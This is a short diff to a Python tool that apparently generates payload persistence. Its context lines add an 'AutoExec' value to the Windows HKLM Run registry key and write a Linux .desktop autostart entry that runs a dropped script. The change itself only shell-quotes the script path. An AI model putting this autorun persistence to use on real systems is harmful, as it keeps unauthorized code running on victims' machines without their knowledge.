@@ -22,6 +22,7 @@ import platform
 import subprocess
 import tempfile
 import struct
+import shlex
 from typing import List, Dict, Any, Optional, Tuple, Callable
 from enum import Enum
 from dataclasses import dataclass
@@ -814,10 +815,13 @@ HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\Run,AutoExec,0,"{payload.deco
             f.write(payload)
         os.chmod(script_path, 0o755)
 
+        # Properly quote script path to prevent injection
+        quoted_script = shlex.quote(script_path)
+
         desktop = f"""[Desktop Entry]
 Type=Application
 Name=AutoExec
-Exec={script_path}
+Exec={quoted_script}
 Terminal=false
 Categories=Utility;
 """
